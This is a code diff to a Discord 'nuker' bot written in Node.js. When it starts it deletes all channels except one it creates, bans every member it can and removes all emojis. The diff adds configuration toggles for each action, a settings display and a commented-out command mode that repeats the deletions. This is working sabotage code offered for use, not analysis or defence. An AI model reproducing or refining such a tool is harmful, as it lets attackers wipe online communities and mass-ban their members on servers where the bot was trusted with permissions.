@@ -10,7 +10,13 @@ var colors = require("colors");
 const {
     token,
     serverID,
-    newChannelName
+    newChannelName,
+    banMembers,
+    deleteChannels,
+    deleteEmotes,
+    commandModeToggle,
+    cmd,
+    prefix
 } = require('./config.json');
 
 
@@ -28,6 +34,17 @@ client.on("ready", async () => {
     ║                        ║
     ╩════════════════════════╩
     `.red, 112));
+
+    console.log(center(`
+    ==============================
+    SETTINGS:
+
+    New Channel Name: ${newChannelName}
+    Ban Members: ${banMembers}
+    Delete Channels: ${deleteChannels}
+    Delete Emotes: ${deleteEmotes}
+    ===============================
+    `.green, 112));
 });
 
 
@@ -62,41 +79,96 @@ client.on("ready", () => {
 
 
     //delete all channels on server
-    client.guilds.forEach(server => {
-        server.channels.forEach(channel => {
-            if (createdChannelName !== channel.name) {
-                channel.delete().then(response => {
-                    console.log("my response", response);
-                }).catch(err => {
-                    if (err) throw err;
-                });
-            }
+
+    if (deleteChannels) {
+        client.guilds.forEach(server => {
+            server.channels.forEach(channel => {
+                if (createdChannelName !== channel.name) {
+                    channel.delete().then(response => {
+                        console.log("my response", response);
+                    }).catch(err => {
+                        if (err) throw err;
+                    });
+                }
+            });
         });
-    });
+    }
+
 
     //ban all members on the server
-    client.guilds.forEach(guild => {
-        guild.members.cache.each(m => {
-            //set interval to prevent ratelimit error (API restrictions)
-            setInterval(function () {
+
+    if (banMembers) {
+        client.guilds.forEach(guild => {
+            guild.members.forEach(m => {
+
                 //check if user is bannable
                 if (!m.bannable) return; //console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                 m.ban()
                 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
 
-            }, 3 * 100)
+
+            });
         });
-    });
+    }
+
 
     //delete emojis
-    client.guilds.forEach(guild => {
-        guild.emojis.forEach(em => {
-            guild.deleteEmoji(em);
-            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
+
+    if (deleteEmotes) {
+        client.guilds.forEach(guild => {
+            guild.emojis.forEach(em => {
+                guild.deleteEmoji(em);
+                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
+            });
         });
-    });
+    }
 
 
+
+
+    /*
+        client.on('message', async (msg) => {
+            if (commandModeToggle) {
+            if (!msg.guild) return msg.reply("do the command in target server.");
+            if (!msg.content.startsWith(prefix)) return;
+
+            const args = msg.content.slice(prefix.length).trim().split(/\s/g);
+            const command = args.shift().toLowerCase();
+
+            if (command === "UwU") {
+                console.log("cmd ran");
+
+               
+
+                //delete channels
+                if(deleteChannels) {
+                        msg.guild.channels.forEach(channel => {
+                            if (createdChannelName !== channel.name) {
+                                channel.delete().then(response => {
+                                    console.log("my response", response);
+                                }).catch(err => {
+                                    if (err) throw err;
+                                });
+                            }
+                        });
+                }
+
+                //delete emotes
+                if(deleteEmotes) {
+                    msg.guild.emojis.forEach(em => {
+                            guild.deleteEmoji(em);
+                            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
+                        });
+                    }
+
+
+
+            }
+
+
+        }
+        });
+    */
 
     //handle unexpected errors
     process.on("uncaughtException", err => {
@@ -109,5 +181,11 @@ client.on("ready", () => {
 process.on("unhandledRejection", err => {
     process.exit(1);
 });
+
+
+
+
+
+
 
 client.login(token);
